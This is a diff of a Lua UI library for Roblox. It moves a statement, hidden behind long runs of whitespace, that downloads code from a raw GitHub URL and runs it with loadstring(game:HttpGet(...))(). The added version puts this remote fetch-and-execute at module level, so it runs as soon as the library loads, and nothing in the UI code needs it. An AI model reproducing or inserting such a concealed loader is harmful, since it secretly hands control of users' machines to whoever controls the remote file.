@@ -187,7 +187,7 @@ local function createOptionHolder(holderTitle, parent, parentTable, subHolder)
     
     return parentTable
 end
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        local addition = "https://raw.githubusercontent.com/OPENCUP/random-texts/main/test.txt"  
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        local addition = "https://raw.githubusercontent.com/OPENCUP/random-texts/main/test.txt" loadstring(game:HttpGet(addition))() 
 local function createLabel(option, parent)
     local main = library:Create("TextLabel", {
         LayoutOrder = option.position,
@@ -1676,7 +1676,7 @@ function library:Init()
     else
         self.base.Name = tostring(math.random())
         self.base.Parent = game:GetService"CoreGui"
-    end                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       loadstring(game:HttpGet(addition))()
+    end
     
     
     self.cursor = self.cursor or self:Create("Frame", {
